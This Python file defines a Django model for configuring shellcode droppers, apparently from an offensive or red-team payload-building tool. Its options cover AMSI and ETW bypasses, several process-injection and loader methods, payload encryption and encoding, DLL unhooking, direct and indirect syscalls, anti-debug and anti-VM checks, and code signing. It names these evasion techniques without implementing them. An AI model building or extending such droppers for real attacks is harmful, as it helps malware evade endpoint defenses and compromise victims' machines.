import uuid
from django.db import models
from api.users.models import User

class DropperConfigModel(models.Model):
    """
    Model to store dropper configuration including file uploads, execution arguments,
    shellcode, and binary signing options.
    """

    class DropperTypes(models.TextChoices):
        ADVANCED = "Advanced", "Advanced"
        BASIC = "Basic", "Basic"
    
    class AMSIBypass(models.TextChoices):
        NONE = "", "None"
        JNE_BASED_AMSI_PATCH = "JNE_BASED_AMSI_PATCH", "JNE Based AMSI Patch"

    class ETWBypass(models.TextChoices):
        NONE = "", "None"
        SYSCALL_BASED_ETW_PATCH = "SYSCALL_BASED_ETW_PATCH", "Syscall Based ETW Patch"
        JMP_RET_BASED_ETW_PATCH = "JMP_RET_BASED_ETW_PATCH", "JMP RET Based ETW Patch"
        CALL_BASED_ETW_PATCH = "CALL_BASED_ETW_PATCH", "Call Based ETW Patch"

    class InjectorType(models.TextChoices):
        APC_INJECTION = "APC_INJECTION", "APC Injection (Local)"
        EARLY_BIRD_INJECTION = "EARLY_BIRD_INJECTION", "Early Bird Injection (Remote)"
        REMOTE_PROCESS_INJECTION = "REMOTE_PROCESS_INJECTION", "Remote Process Injection (Remote)"
        EARLY_CASCADE_INJECTION = "EARLY_CASCADE_INJECTION", "Early Cascade Injection (Remote)"

    class LoaderType(models.TextChoices):
        IN_MEMORY = "IN_MEMORY", "In Memory"
        FUNCTION_STOMPING = "FUNCTION_STOMPING", "Function Stomping"
        FILE_MAPPING = "FILE_MAPPING", "File Mapping"

    class ObfuscationType(models.TextChoices):
        NONE = "", "None"
        AES_ENCRYPTION = "AES_ENCRYPTION", "AES Encryption"
        XOR_ENCRYPTION = "XOR_ENCRYPTION", "XOR Encryption"
        RC4_ENCRYPTION = "RC4_ENCRYPTION", "RC4 Encryption"
        IPV4_OBFUSCATION = "IPV4_OBFUSCATION", "IPv4 Encoding"
        IPV6_OBFUSCATION = "IPV6_OBFUSCATION", "IPv6 Encoding"
        UUID_OBFUSCATION = "UUID_OBFUSCATION", "UUID Encoding"
        MAC_OBFUSCATION = "MAC_OBFUSCATION", "MAC Encoding"

    class UnhookingType(models.TextChoices):
        NONE = "", "None"
        SUSPENDED_PROCESS_UNHOOKING = "SUSPENDED_PROCESS_UNHOOKING", "Suspended Process Unhooking"
        KNOWN_DLLS_UNHOOKING = "KNOWN_DLLS_UNHOOKING", "Known DLLs Unhooking"

    class SyscallsType(models.TextChoices):
        NONE = "", "None"
        SW3_SYSCALLS = "SW3_SYSCALLS", "SysWhispers3 Syscalls (direct)"
        HW_SYSCALLS = "HW_SYSCALLS", "HWSyscalls Syscalls (indirect)"


    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    name = models.CharField(max_length=255, unique=False)
    description = models.TextField(blank=True, null=True)
    is_template = models.BooleanField(default=False)
    dropper_type = models.CharField(max_length=100, choices=DropperTypes.choices, default=DropperTypes.ADVANCED)

    # Features
    anti_analysis = models.BooleanField(default=False, help_text="Enable anti-analysis techniques")
    anti_debug = models.BooleanField(default=False, help_text="Enable anti-debugging techniques")
    anti_vm = models.BooleanField(default=False, help_text="Enable anti-VM techniques")
    
    amsi_bypass = models.CharField(max_length=255, choices=AMSIBypass.choices, default=AMSIBypass.NONE, blank=True, null=True)
    etw_bypass = models.CharField(max_length=255, choices=ETWBypass.choices, default=ETWBypass.NONE, blank=True, null=True)
    injector = models.CharField(max_length=255, choices=InjectorType.choices, default=InjectorType.APC_INJECTION, blank=True, null=True)
    loader = models.CharField(max_length=255, choices=LoaderType.choices, default=LoaderType.IN_MEMORY, blank=True, null=True)
    obfuscation = models.CharField(max_length=255, choices=ObfuscationType.choices, default=ObfuscationType.NONE, blank=True, null=True)
    unhooking = models.CharField(max_length=255, choices=UnhookingType.choices, default=UnhookingType.NONE, blank=True, null=True)
    syscalls = models.CharField(max_length=255, choices=SyscallsType.choices, default=SyscallsType.NONE, blank=True, null=True)
    
    # Global Options
    debug_mode = models.BooleanField(default=False, help_text="Enable debugging output", blank=True, null=True)
    hide_console = models.BooleanField(default=False, help_text="Hide console window", blank=True, null=True)
    redirect_output = models.BooleanField(default=False, help_text="Redirect output to current console", blank=True, null=True)
    remote_process_name = models.CharField(default=False, help_text="Target remote process name (for injection methods targetting a remote process)", blank=True, null=True)
    
    # Binary Signing Configuration
    binary_signing_enabled = models.BooleanField(default=False, blank=True, null=True)
    certificate_file = models.FileField(upload_to='certs/', null=True, blank=True, help_text="Certificate file for code signing")
    certificate_password = models.CharField(max_length=255, blank=True, help_text="Password for the certificate file")
    timestamp_server = models.URLField(max_length=255, blank=True, default="", help_text="URL of the timestamp server for code signing")
    
    # Output Configuration
    output_extension = models.CharField(max_length=10, default="exe", help_text="File extension for the output file")
    
    # Metadata
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)
    created_by = models.ForeignKey(User, on_delete=models.SET_NULL, null=True, related_name='createdby_dropper_configs')
    
    def __str__(self):
        return f"Dropper Config {self.name} ({self.description})"
    
    class Meta:
        verbose_name = "Dropper Configuration"
        verbose_name_plural = "Dropper Configurations"
        ordering = ['-created_at']